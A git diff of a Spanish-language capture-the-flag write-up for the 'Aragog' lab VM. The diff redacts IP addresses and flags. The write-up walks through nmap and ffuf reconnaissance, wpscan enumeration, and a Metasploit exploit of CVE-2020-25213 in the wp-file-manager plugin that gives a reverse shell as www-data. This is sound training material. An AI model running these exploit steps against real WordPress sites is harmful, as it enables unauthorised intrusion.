@@ -39,21 +39,21 @@ Aquí veremos que esta conectado a la subred, los puerto abiertos, las paginas w
 
 Veremos que redes estan conectadas a esta subred con este comando:
 
-```nmap -sP 192.168.221.0/24```
+```nmap -sP X.X.X.0/24```
 
 Para ver los puertos abiertos que tiene la red utilizaremos este comando:
 
-```nmap -sV -sC 192.168.221.7```
+```nmap -sV -sC X.X.X.7```
 
 ### Fuzz
 
 Fuzzearemos la web para ver quw tiene:
 
-```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.221.7/FUZZ```
+```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://X.X.X..7/FUZZ```
 
 Despues fuzzearemos el **/blog/**:
 
-```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.221.7/blog/FUZZ```
+```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://X.X.X..7/blog/FUZZ```
 
 ## Búsqueda de vulnerabilidades
 
@@ -61,14 +61,14 @@ Despues fuzzearemos el **/blog/**:
 
 Al ver que es un **wordpress** usaremos el **wpscan**:
 
-```wpscan --url http://192.168.221.7/blog/ --plugins-detection aggressive```
+```wpscan --url http://X.X.X.7/blog/ --plugins-detection aggressive```
 
 Esto es lo que recibimos con el wpscan:
 ```
         wp-file-manager
-         | Location: http://192.168.221.7/blog/wp-content/plugins/wp-file-manager/
+         | Location: http://X.X.X..7/blog/wp-content/plugins/wp-file-manager/
          | Last Updated: 2021-03-30T06:37:00.000Z
-         | Readme: http://192.168.221.7/blog/wp-content/plugins/wp-file-manager/readme.txt
+         | Readme: http://X.X.X..7/blog/wp-content/plugins/wp-file-manager/readme.txt
          | [!] The version is out of date, the latest version is 7.1.1
 ```
 
@@ -82,8 +82,8 @@ Ahora en metasploit configuraremos esto para explotar esa vulnerabilidad:
 ```
         search CVE-2020-25213
         use 0
-        set rhosts 192.168.221.7
-        set lhost 192.168.221.4
+        set rhosts X.X.X..7
+        set lhost X.X.X..4
         set targeturi /blog
         exploit
 ```
@@ -96,7 +96,7 @@ Con esto hemos conseguido ser el usuario **www-data**
 
 Desde donde estamos podemos conseguir la primera flag del usuario **hagrid98**
 
-Aquí la primera flag: **horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}**
+Aquí la primera flag: X
 
 Ahora buscando encontraremos esta ruta que tiene buena pinta: ```/etc/wordpress```
 
@@ -190,7 +190,7 @@ Machine Name: Aragog
 Horcruxes Hidden in this VM: 2 horcruxes
 
 You have successfully pwned Aragog machine.
-Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}
+Here is your second hocrux: X
 
 
 
